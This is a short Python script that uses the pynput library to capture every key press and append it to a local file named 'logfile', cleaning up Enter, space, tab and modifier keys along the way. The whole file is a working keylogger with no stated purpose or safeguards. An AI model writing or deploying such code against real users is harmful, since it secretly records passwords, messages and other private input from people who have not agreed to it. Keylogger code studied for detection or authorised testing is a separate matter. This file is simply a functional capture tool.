from pynput.keyboard import Listener
from pynput.keyboard import Key

def file_write(key):
    if key == Key.enter:
        key = '\n'
    if key == Key.ctrl_l:
        key = ''
    if key == Key.ctrl_r:
        key = ''
    if key == Key.shift_l:
        key = ''
    if key == Key.shift_r:
        key = ''
    if key == Key.space:
        key = ' '
    if key == Key.alt_l:
        key = ''
    if key == Key.alt_r:
        key = ''
    if key == Key.tab:
        key = ' '
    with open("logfile", 'a') as file:
        file.write(str(key).replace("'", ""))

with Listener(on_press=file_write) as listener:
    listener.join()